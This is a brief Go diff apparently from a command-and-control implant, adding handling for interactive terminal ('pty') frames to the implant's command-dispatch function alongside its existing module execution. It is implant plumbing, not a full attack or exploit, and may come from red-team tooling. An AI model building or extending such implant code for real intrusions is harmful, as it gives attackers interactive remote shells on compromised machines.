@@ -695,6 +695,15 @@ func (imp *Implant) handleCommandPayload(seqNum int, payload string) {
 		return
 	}
 
+	// Handle PTY frames (interactive terminal)
+	if msg.Module == "pty" {
+		imp.handlePtyFrame(msg)
+		imp.seqMu.Lock()
+		imp.processedSeqs[seqNum] = true
+		imp.seqMu.Unlock()
+		return
+	}
+
 	imp.logf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
 
 	// Async execution: dispatch to goroutine, send result via channel
